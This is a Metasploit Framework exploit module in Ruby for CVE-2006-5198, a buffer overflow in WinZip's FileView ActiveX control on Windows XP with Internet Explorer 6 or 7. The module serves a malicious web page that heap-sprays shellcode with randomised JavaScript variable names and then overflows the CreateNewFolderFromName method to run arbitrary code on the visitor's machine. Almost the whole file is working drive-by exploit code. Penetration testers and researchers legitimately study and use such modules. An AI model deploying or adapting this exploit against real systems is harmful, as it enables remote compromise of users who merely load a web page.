##
# $Id: winzip_fileview.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name    => HttpClients::IE,
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:vuln_test  => 'CreateNewFolderFromName',
		:classid    => '{A09AE68F-B14D-43ED-B713-BA413F034904}',
		:rank       => NormalRanking  # reliable memory corruption
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WinZip FileView (WZFILEVIEW.FileViewCtrl.61) ActiveX Buffer Overflow',
			'Description'    => %q{
					The FileView ActiveX control (WZFILEVIEW.FileViewCtrl.61) could allow a
				remote attacker to execute arbitrary code on the system. The control contains
				several unsafe methods and is marked safe for scripting and safe for initialization.
				A remote attacker could exploit this vulnerability to execute arbitrary code on the
				victim system. WinZip 10.0 <= Build 6667 are vulnerable.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'dean <dean[at]zerodaysolutions.com>' ],
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE','2006-5198' ],
					[ 'OSVDB', '30433' ],
					[ 'BID','21060' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP2/ IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0c0c0c0c } ]
				],
			'DisclosureDate' => 'Nov 2 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Set the return.
		ret    = Rex::Text.uri_encode([target.ret].pack('L'))

		# Randomize the javascript variable names.
		vname  = rand_text_alpha(rand(100) + 1)
		var_i  = rand_text_alpha(rand(30)  + 2)
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(rand(100) + 1)
		rand5  = rand_text_alpha(rand(100) + 1)
		rand6  = rand_text_alpha(rand(100) + 1)
		rand7  = rand_text_alpha(rand(100) + 1)
		rand8  = rand_text_alpha(rand(100) + 1)

		content = %Q|
			<html>
				<object id='#{vname}' classid='clsid:A09AE68F-B14D-43ED-B713-BA413F034904'></object>
				<script language="JavaScript">
				var #{rand1} = unescape('#{shellcode}');
				var #{rand2} = unescape('#{ret}');
				var #{rand3} = 20;
				var #{rand4} = #{rand3} + #{rand1}.length;
				while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};
				var #{rand5} = #{rand2}.substring(0,#{rand4});
				var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});
				while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};
				var #{rand7} = new Array();
				for (#{var_i} = 0; #{var_i} < 800; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }
				var #{rand8} = "A";
				for (#{var_i} = 0; #{var_i} < 1024; #{var_i}++) { #{rand8} = #{rand8} + #{rand2} }
				#{vname}.CreateNewFolderFromName(#{rand8});
				</script>
			</html>
			|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
